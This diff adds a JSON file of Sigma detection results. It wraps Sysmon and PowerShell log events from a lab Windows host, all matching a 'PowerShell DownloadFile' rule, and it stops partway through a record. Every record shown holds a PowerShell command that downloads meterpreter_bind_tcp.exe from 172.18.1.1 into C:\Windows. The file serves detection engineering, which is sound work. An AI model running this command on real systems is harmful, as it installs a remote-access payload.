@@ -1,0 +1,1942 @@
+[
+    {
+        "group": "Sigma",
+        "kind": "individual",
+        "document": {
+            "kind": "jsonl",
+            "data": {
+                "@timestamp": "2022-10-10T11:17:50.599Z",
+                "agent": {
+                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
+                    "hostname": "CLIENT1",
+                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
+                    "name": "CLIENT1",
+                    "type": "winlogbeat",
+                    "version": "7.10.2"
+                },
+                "ecs": {
+                    "version": "1.5.0"
+                },
+                "event": {
+                    "action": "Process Create (rule: ProcessCreate)",
+                    "category": [
+                        "process"
+                    ],
+                    "code": 1,
+                    "created": "2022-10-10T11:17:51.468Z",
+                    "kind": "event",
+                    "module": "sysmon",
+                    "provider": "Microsoft-Windows-Sysmon",
+                    "type": [
+                        "start",
+                        "process_start"
+                    ]
+                },
+                "hash": {
+                    "imphash": "272245e2988e1e430500b852c4fb5e18",
+                    "md5": "8a2122e8162dbef04694b9c3e0b6cdee",
+                    "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"
+                },
+                "host": {
+                    "name": "CLIENT1.breach.local"
+                },
+                "log": {
+                    "level": "information"
+                },
+                "message": "Process Create:\nRuleName: -\nUtcTime: 2022-10-10 11:17:50.599\nProcessGuid: {0e37ca90-ff5e-6343-f911-000000000500}\nProcessId: 7044\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.\nCurrentDirectory: C:\\Users\\ssh\\\nUser: CLIENT1\\ssh\nLogonGuid: {0e37ca90-ff5e-6343-acea-df0000000000}\nLogonId: 0xDFEAAC\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {0e37ca90-ff5e-6343-f811-000000000500}\nParentProcessId: 6688\nParentImage: C:\\Windows\\System32\\conhost.exe\nParentCommandLine: C:\\Windows\\system32\\conhost.exe --headless --width 80 --height 24 --signal 0x1f0 -- \"c:\\windows\\system32\\cmd.exe\" /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.\nParentUser: CLIENT1\\ssh",
+                "process": {
+                    "args": [
+                        "c:\\windows\\system32\\cmd.exe",
+                        "/c",
+                        "cmd",
+                        "/C",
+                        "powershell",
+                        "-Command",
+                        "$c",
+                        "=",
+                        "new-object",
+                        "System.Net.WebClient;",
+                        "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",",
+                        "\"C:\\Windows\\meterpreter_bind_tcp.exe\")",
+                        "&&",
+                        "echo",
+                        "File",
+                        "downloaded",
+                        "successfully."
+                    ],
+                    "command_line": "c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.",
+                    "entity_id": "{0e37ca90-ff5e-6343-f911-000000000500}",
+                    "executable": "C:\\Windows\\System32\\cmd.exe",
+                    "hash": {
+                        "md5": "8a2122e8162dbef04694b9c3e0b6cdee",
+                        "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"
+                    },
+                    "name": "cmd.exe",
+                    "parent": {
+                        "args": [
+                            "C:\\Windows\\system32\\conhost.exe",
+                            "--headless",
+                            "--width",
+                            "80",
+                            "--height",
+                            "24",
+                            "--signal",
+                            "0x1f0",
+                            "--",
+                            "c:\\windows\\system32\\cmd.exe",
+                            "/c",
+                            "cmd",
+                            "/C",
+                            "powershell",
+                            "-Command",
+                            "$c",
+                            "=",
+                            "new-object",
+                            "System.Net.WebClient;",
+                            "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",",
+                            "\"C:\\Windows\\meterpreter_bind_tcp.exe\")",
+                            "&&",
+                            "echo",
+                            "File",
+                            "downloaded",
+                            "successfully."
+                        ],
+                        "command_line": "C:\\Windows\\system32\\conhost.exe --headless --width 80 --height 24 --signal 0x1f0 -- \"c:\\windows\\system32\\cmd.exe\" /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.",
+                        "entity_id": "{0e37ca90-ff5e-6343-f811-000000000500}",
+                        "executable": "C:\\Windows\\System32\\conhost.exe",
+                        "name": "conhost.exe",
+                        "pid": 6688
+                    },
+                    "pe": {
+                        "imphash": "272245e2988e1e430500b852c4fb5e18"
+                    },
+                    "pid": 7044,
+                    "working_directory": "C:\\Users\\ssh\\"
+                },
+                "related": {
+                    "hash": [
+                        "8a2122e8162dbef04694b9c3e0b6cdee",
+                        "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450",
+                        "272245e2988e1e430500b852c4fb5e18"
+                    ],
+                    "user": "ssh"
+                },
+                "user": {
+                    "domain": "CLIENT1",
+                    "name": "ssh"
+                },
+                "winlog": {
+                    "api": "wineventlog",
+                    "channel": "Microsoft-Windows-Sysmon/Operational",
+                    "computer_name": "CLIENT1.breach.local",
+                    "event_data": {
+                        "Company": "Microsoft Corporation",
+                        "Description": "Windows Command Processor",
+                        "FileVersion": "10.0.19041.746 (WinBuild.160101.0800)",
+                        "IntegrityLevel": "High",
+                        "LogonGuid": "{0e37ca90-ff5e-6343-acea-df0000000000}",
+                        "LogonId": "0xdfeaac",
+                        "OriginalFileName": "Cmd.Exe",
+                        "ParentUser": "CLIENT1\\ssh",
+                        "Product": "Microsoft® Windows® Operating System",
+                        "RuleName": "-",
+                        "TerminalSessionId": "0"
+                    },
+                    "event_id": 1,
+                    "opcode": "Info",
+                    "process": {
+                        "pid": 1160,
+                        "thread": {
+                            "id": 2496
+                        }
+                    },
+                    "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+                    "provider_name": "Microsoft-Windows-Sysmon",
+                    "record_id": 9199,
+                    "task": "Process Create (rule: ProcessCreate)",
+                    "user": {
+                        "domain": "NT AUTHORITY",
+                        "identifier": "S-1-5-18",
+                        "name": "SYSTEM",
+                        "type": "User"
+                    },
+                    "version": 5
+                }
+            }
+        },
+        "name": "PowerShell DownloadFile",
+        "timestamp": "2022-10-10T11:17:50.599+00:00",
+        "authors": [
+            "Florian Roth"
+        ],
+        "level": "high",
+        "source": "sigma",
+        "status": "experimental",
+        "falsepositives": [
+            "Unknown"
+        ],
+        "id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
+        "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+        },
+        "references": [
+            "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+        ],
+        "tags": [
+            "attack.execution",
+            "attack.t1059.001",
+            "attack.command_and_control",
+            "attack.t1104",
+            "attack.t1105"
+        ]
+    },
+    {
+        "group": "Sigma",
+        "kind": "individual",
+        "document": {
+            "kind": "jsonl",
+            "data": {
+                "@timestamp": "2022-10-10T11:17:50.611Z",
+                "agent": {
+                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
+                    "hostname": "CLIENT1",
+                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
+                    "name": "CLIENT1",
+                    "type": "winlogbeat",
+                    "version": "7.10.2"
+                },
+                "ecs": {
+                    "version": "1.5.0"
+                },
+                "event": {
+                    "action": "Process Create (rule: ProcessCreate)",
+                    "category": [
+                        "process"
+                    ],
+                    "code": 1,
+                    "created": "2022-10-10T11:17:51.469Z",
+                    "kind": "event",
+                    "module": "sysmon",
+                    "provider": "Microsoft-Windows-Sysmon",
+                    "type": [
+                        "start",
+                        "process_start"
+                    ]
+                },
+                "hash": {
+                    "imphash": "272245e2988e1e430500b852c4fb5e18",
+                    "md5": "8a2122e8162dbef04694b9c3e0b6cdee",
+                    "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"
+                },
+                "host": {
+                    "name": "CLIENT1.breach.local"
+                },
+                "log": {
+                    "level": "information"
+                },
+                "message": "Process Create:\nRuleName: -\nUtcTime: 2022-10-10 11:17:50.611\nProcessGuid: {0e37ca90-ff5e-6343-fa11-000000000500}\nProcessId: 5020\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") \nCurrentDirectory: C:\\Users\\ssh\\\nUser: CLIENT1\\ssh\nLogonGuid: {0e37ca90-ff5e-6343-acea-df0000000000}\nLogonId: 0xDFEAAC\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {0e37ca90-ff5e-6343-f911-000000000500}\nParentProcessId: 7044\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.\nParentUser: CLIENT1\\ssh",
+                "process": {
+                    "args": [
+                        "cmd",
+                        "/C",
+                        "powershell",
+                        "-Command",
+                        "$c",
+                        "=",
+                        "new-object",
+                        "System.Net.WebClient;",
+                        "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",",
+                        "\"C:\\Windows\\meterpreter_bind_tcp.exe\")"
+                    ],
+                    "command_line": "cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") ",
+                    "entity_id": "{0e37ca90-ff5e-6343-fa11-000000000500}",
+                    "executable": "C:\\Windows\\System32\\cmd.exe",
+                    "hash": {
+                        "md5": "8a2122e8162dbef04694b9c3e0b6cdee",
+                        "sha256": "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450"
+                    },
+                    "name": "cmd.exe",
+                    "parent": {
+                        "args": [
+                            "c:\\windows\\system32\\cmd.exe",
+                            "/c",
+                            "cmd",
+                            "/C",
+                            "powershell",
+                            "-Command",
+                            "$c",
+                            "=",
+                            "new-object",
+                            "System.Net.WebClient;",
+                            "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",",
+                            "\"C:\\Windows\\meterpreter_bind_tcp.exe\")",
+                            "&&",
+                            "echo",
+                            "File",
+                            "downloaded",
+                            "successfully."
+                        ],
+                        "command_line": "c:\\windows\\system32\\cmd.exe /c cmd /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") && echo File downloaded successfully.",
+                        "entity_id": "{0e37ca90-ff5e-6343-f911-000000000500}",
+                        "executable": "C:\\Windows\\System32\\cmd.exe",
+                        "name": "cmd.exe",
+                        "pid": 7044
+                    },
+                    "pe": {
+                        "imphash": "272245e2988e1e430500b852c4fb5e18"
+                    },
+                    "pid": 5020,
+                    "working_directory": "C:\\Users\\ssh\\"
+                },
+                "related": {
+                    "hash": [
+                        "8a2122e8162dbef04694b9c3e0b6cdee",
+                        "b99d61d874728edc0918ca0eb10eab93d381e7367e377406e65963366c874450",
+                        "272245e2988e1e430500b852c4fb5e18"
+                    ],
+                    "user": "ssh"
+                },
+                "user": {
+                    "domain": "CLIENT1",
+                    "name": "ssh"
+                },
+                "winlog": {
+                    "api": "wineventlog",
+                    "channel": "Microsoft-Windows-Sysmon/Operational",
+                    "computer_name": "CLIENT1.breach.local",
+                    "event_data": {
+                        "Company": "Microsoft Corporation",
+                        "Description": "Windows Command Processor",
+                        "FileVersion": "10.0.19041.746 (WinBuild.160101.0800)",
+                        "IntegrityLevel": "High",
+                        "LogonGuid": "{0e37ca90-ff5e-6343-acea-df0000000000}",
+                        "LogonId": "0xdfeaac",
+                        "OriginalFileName": "Cmd.Exe",
+                        "ParentUser": "CLIENT1\\ssh",
+                        "Product": "Microsoft® Windows® Operating System",
+                        "RuleName": "-",
+                        "TerminalSessionId": "0"
+                    },
+                    "event_id": 1,
+                    "opcode": "Info",
+                    "process": {
+                        "pid": 1160,
+                        "thread": {
+                            "id": 2496
+                        }
+                    },
+                    "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+                    "provider_name": "Microsoft-Windows-Sysmon",
+                    "record_id": 9200,
+                    "task": "Process Create (rule: ProcessCreate)",
+                    "user": {
+                        "domain": "NT AUTHORITY",
+                        "identifier": "S-1-5-18",
+                        "name": "SYSTEM",
+                        "type": "User"
+                    },
+                    "version": 5
+                }
+            }
+        },
+        "name": "PowerShell DownloadFile",
+        "timestamp": "2022-10-10T11:17:50.611+00:00",
+        "authors": [
+            "Florian Roth"
+        ],
+        "level": "high",
+        "source": "sigma",
+        "status": "experimental",
+        "falsepositives": [
+            "Unknown"
+        ],
+        "id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
+        "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+        },
+        "references": [
+            "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+        ],
+        "tags": [
+            "attack.execution",
+            "attack.t1059.001",
+            "attack.command_and_control",
+            "attack.t1104",
+            "attack.t1105"
+        ]
+    },
+    {
+        "group": "Sigma",
+        "kind": "individual",
+        "document": {
+            "kind": "jsonl",
+            "data": {
+                "@timestamp": "2022-10-10T11:17:50.620Z",
+                "agent": {
+                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
+                    "hostname": "CLIENT1",
+                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
+                    "name": "CLIENT1",
+                    "type": "winlogbeat",
+                    "version": "7.10.2"
+                },
+                "ecs": {
+                    "version": "1.5.0"
+                },
+                "event": {
+                    "action": "Process Create (rule: ProcessCreate)",
+                    "category": [
+                        "process"
+                    ],
+                    "code": 1,
+                    "created": "2022-10-10T11:17:51.469Z",
+                    "kind": "event",
+                    "module": "sysmon",
+                    "provider": "Microsoft-Windows-Sysmon",
+                    "type": [
+                        "start",
+                        "process_start"
+                    ]
+                },
+                "hash": {
+                    "imphash": "7c955a0abc747f57ccc4324480737ef7",
+                    "md5": "04029e121a0cfa5991749937dd22a1d9",
+                    "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"
+                },
+                "host": {
+                    "name": "CLIENT1.breach.local"
+                },
+                "log": {
+                    "level": "information"
+                },
+                "message": "Process Create:\nRuleName: -\nUtcTime: 2022-10-10 11:17:50.620\nProcessGuid: {0e37ca90-ff5e-6343-fb11-000000000500}\nProcessId: 4368\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.19041.546 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") \nCurrentDirectory: C:\\Users\\ssh\\\nUser: CLIENT1\\ssh\nLogonGuid: {0e37ca90-ff5e-6343-acea-df0000000000}\nLogonId: 0xDFEAAC\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7\nParentProcessGuid: {0e37ca90-ff5e-6343-fa11-000000000500}\nParentProcessId: 5020\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") \nParentUser: CLIENT1\\ssh",
+                "process": {
+                    "args": [
+                        "powershell",
+                        "-Command",
+                        "$c",
+                        "=",
+                        "new-object",
+                        "System.Net.WebClient;",
+                        "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",",
+                        "\"C:\\Windows\\meterpreter_bind_tcp.exe\")"
+                    ],
+                    "command_line": "powershell  -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") ",
+                    "entity_id": "{0e37ca90-ff5e-6343-fb11-000000000500}",
+                    "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                    "hash": {
+                        "md5": "04029e121a0cfa5991749937dd22a1d9",
+                        "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f"
+                    },
+                    "name": "powershell.exe",
+                    "parent": {
+                        "args": [
+                            "cmd",
+                            "/C",
+                            "powershell",
+                            "-Command",
+                            "$c",
+                            "=",
+                            "new-object",
+                            "System.Net.WebClient;",
+                            "$c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\",",
+                            "\"C:\\Windows\\meterpreter_bind_tcp.exe\")"
+                        ],
+                        "command_line": "cmd  /C powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\\\"http://172.18.1.1/meterpreter_bind_tcp.exe\\\", \\\"C:\\Windows\\meterpreter_bind_tcp.exe\\\") ",
+                        "entity_id": "{0e37ca90-ff5e-6343-fa11-000000000500}",
+                        "executable": "C:\\Windows\\System32\\cmd.exe",
+                        "name": "cmd.exe",
+                        "pid": 5020
+                    },
+                    "pe": {
+                        "imphash": "7c955a0abc747f57ccc4324480737ef7"
+                    },
+                    "pid": 4368,
+                    "working_directory": "C:\\Users\\ssh\\"
+                },
+                "related": {
+                    "hash": [
+                        "04029e121a0cfa5991749937dd22a1d9",
+                        "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f",
+                        "7c955a0abc747f57ccc4324480737ef7"
+                    ],
+                    "user": "ssh"
+                },
+                "user": {
+                    "domain": "CLIENT1",
+                    "name": "ssh"
+                },
+                "winlog": {
+                    "api": "wineventlog",
+                    "channel": "Microsoft-Windows-Sysmon/Operational",
+                    "computer_name": "CLIENT1.breach.local",
+                    "event_data": {
+                        "Company": "Microsoft Corporation",
+                        "Description": "Windows PowerShell",
+                        "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+                        "IntegrityLevel": "High",
+                        "LogonGuid": "{0e37ca90-ff5e-6343-acea-df0000000000}",
+                        "LogonId": "0xdfeaac",
+                        "OriginalFileName": "PowerShell.EXE",
+                        "ParentUser": "CLIENT1\\ssh",
+                        "Product": "Microsoft® Windows® Operating System",
+                        "RuleName": "-",
+                        "TerminalSessionId": "0"
+                    },
+                    "event_id": 1,
+                    "opcode": "Info",
+                    "process": {
+                        "pid": 1160,
+                        "thread": {
+                            "id": 2496
+                        }
+                    },
+                    "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+                    "provider_name": "Microsoft-Windows-Sysmon",
+                    "record_id": 9201,
+                    "task": "Process Create (rule: ProcessCreate)",
+                    "user": {
+                        "domain": "NT AUTHORITY",
+                        "identifier": "S-1-5-18",
+                        "name": "SYSTEM",
+                        "type": "User"
+                    },
+                    "version": 5
+                }
+            }
+        },
+        "name": "PowerShell DownloadFile",
+        "timestamp": "2022-10-10T11:17:50.620+00:00",
+        "authors": [
+            "Florian Roth"
+        ],
+        "level": "high",
+        "source": "sigma",
+        "status": "experimental",
+        "falsepositives": [
+            "Unknown"
+        ],
+        "id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
+        "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+        },
+        "references": [
+            "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+        ],
+        "tags": [
+            "attack.execution",
+            "attack.t1059.001",
+            "attack.command_and_control",
+            "attack.t1104",
+            "attack.t1105"
+        ]
+    },
+    {
+        "group": "Sigma",
+        "kind": "individual",
+        "document": {
+            "kind": "jsonl",
+            "data": {
+                "@timestamp": "2022-10-10T11:17:50.838Z",
+                "agent": {
+                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
+                    "hostname": "CLIENT1",
+                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
+                    "name": "CLIENT1",
+                    "type": "winlogbeat",
+                    "version": "7.10.2"
+                },
+                "ecs": {
+                    "version": "1.5.0"
+                },
+                "event": {
+                    "action": "Provider Lifecycle",
+                    "category": [
+                        "process"
+                    ],
+                    "code": 600,
+                    "created": "2022-10-10T11:17:51.429Z",
+                    "kind": "event",
+                    "module": "powershell",
+                    "provider": "PowerShell",
+                    "sequence": 9,
+                    "type": [
+                        "info"
+                    ]
+                },
+                "host": {
+                    "name": "CLIENT1.breach.local"
+                },
+                "log": {
+                    "level": "information"
+                },
+                "message": "Provider \"Function\" is Started. \n\nDetails: \n\tProviderName=Function\n\tNewProviderState=Started\n\n\tSequenceNumber=9\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=99dc06f6-7551-484b-b322-01da00740dca\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=",
+                "powershell": {
+                    "process": {
+                        "executable_version": "5.1.19041.1237"
+                    },
+                    "provider": {
+                        "name": "Function",
+                        "new_state": "Started"
+                    }
+                },
+                "process": {
+                    "args": [
+                        "powershell",
+                        "-Command",
+                        "$c",
+                        "=",
+                        "new-object",
+                        "System.Net.WebClient;",
+                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
+                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
+                    ],
+                    "args_count": 8,
+                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
+                    "entity_id": "99dc06f6-7551-484b-b322-01da00740dca",
+                    "title": "ConsoleHost"
+                },
+                "winlog": {
+                    "api": "wineventlog",
+                    "channel": "Windows PowerShell",
+                    "computer_name": "CLIENT1.breach.local",
+                    "event_id": 600,
+                    "keywords": [
+                        "Classic"
+                    ],
+                    "opcode": "Info",
+                    "provider_name": "PowerShell",
+                    "record_id": 6593,
+                    "task": "Provider Lifecycle"
+                }
+            }
+        },
+        "name": "PowerShell DownloadFile",
+        "timestamp": "2022-10-10T11:17:50.838+00:00",
+        "authors": [
+            "Florian Roth"
+        ],
+        "level": "high",
+        "source": "sigma",
+        "status": "experimental",
+        "falsepositives": [
+            "Unknown"
+        ],
+        "id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
+        "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+        },
+        "references": [
+            "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+        ],
+        "tags": [
+            "attack.execution",
+            "attack.t1059.001",
+            "attack.command_and_control",
+            "attack.t1104",
+            "attack.t1105"
+        ]
+    },
+    {
+        "group": "Sigma",
+        "kind": "individual",
+        "document": {
+            "kind": "jsonl",
+            "data": {
+                "@timestamp": "2022-10-10T11:17:50.838Z",
+                "agent": {
+                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
+                    "hostname": "CLIENT1",
+                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
+                    "name": "CLIENT1",
+                    "type": "winlogbeat",
+                    "version": "7.10.2"
+                },
+                "ecs": {
+                    "version": "1.5.0"
+                },
+                "event": {
+                    "action": "Provider Lifecycle",
+                    "category": [
+                        "process"
+                    ],
+                    "code": 600,
+                    "created": "2022-10-10T11:17:51.428Z",
+                    "kind": "event",
+                    "module": "powershell",
+                    "provider": "PowerShell",
+                    "sequence": 3,
+                    "type": [
+                        "info"
+                    ]
+                },
+                "host": {
+                    "name": "CLIENT1.breach.local"
+                },
+                "log": {
+                    "level": "information"
+                },
+                "message": "Provider \"Alias\" is Started. \n\nDetails: \n\tProviderName=Alias\n\tNewProviderState=Started\n\n\tSequenceNumber=3\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=99dc06f6-7551-484b-b322-01da00740dca\n\tHostApplication=powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine=",
+                "powershell": {
+                    "process": {
+                        "executable_version": "5.1.19041.1237"
+                    },
+                    "provider": {
+                        "name": "Alias",
+                        "new_state": "Started"
+                    }
+                },
+                "process": {
+                    "args": [
+                        "powershell",
+                        "-Command",
+                        "$c",
+                        "=",
+                        "new-object",
+                        "System.Net.WebClient;",
+                        "$c.DownloadFile(http://172.18.1.1/meterpreter_bind_tcp.exe,",
+                        "C:\\Windows\\meterpreter_bind_tcp.exe)"
+                    ],
+                    "args_count": 8,
+                    "command_line": "powershell -Command $c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")",
+                    "entity_id": "99dc06f6-7551-484b-b322-01da00740dca",
+                    "title": "ConsoleHost"
+                },
+                "winlog": {
+                    "api": "wineventlog",
+                    "channel": "Windows PowerShell",
+                    "computer_name": "CLIENT1.breach.local",
+                    "event_id": 600,
+                    "keywords": [
+                        "Classic"
+                    ],
+                    "opcode": "Info",
+                    "provider_name": "PowerShell",
+                    "record_id": 6590,
+                    "task": "Provider Lifecycle"
+                }
+            }
+        },
+        "name": "PowerShell DownloadFile",
+        "timestamp": "2022-10-10T11:17:50.838+00:00",
+        "authors": [
+            "Florian Roth"
+        ],
+        "level": "high",
+        "source": "sigma",
+        "status": "experimental",
+        "falsepositives": [
+            "Unknown"
+        ],
+        "id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
+        "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+        },
+        "references": [
+            "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+        ],
+        "tags": [
+            "attack.execution",
+            "attack.t1059.001",
+            "attack.command_and_control",
+            "attack.t1104",
+            "attack.t1105"
+        ]
+    },
+    {
+        "group": "Sigma",
+        "kind": "individual",
+        "document": {
+            "kind": "jsonl",
+            "data": {
+                "@timestamp": "2022-10-10T11:17:50.838Z",
+                "agent": {
+                    "ephemeral_id": "64b72b79-c8b3-44d5-8efc-41706d768842",
+                    "hostname": "CLIENT1",
+                    "id": "cd699c72-0f46-4cd9-938a-43faf035a44a",
+                    "name": "CLIENT1",
+                    "type": "winlogbeat",
+                    "version": "7.10.2"
+                },
+                "ecs": {
+                    "version": "1.5.0"
+                },
+                "event": {
+                    "action": "Engine Lifecycle",
+                    "category": [
+                        "process"
+                    ],
+                    "code": 400,
+                    "created": "2022-10-10T11:17:51.429Z",
+                    "kind": "event",
+                    "module": "powershell",
+                    "provider": "PowerShell",
+                    "sequence": 13,
+                    "type": [
+                        "start"
+                    ]
+                },
+                "host": {
+                    "name": "CLIENT1.breach.local"
+                },
+                "log": {
+                    "level": "information"
+                },
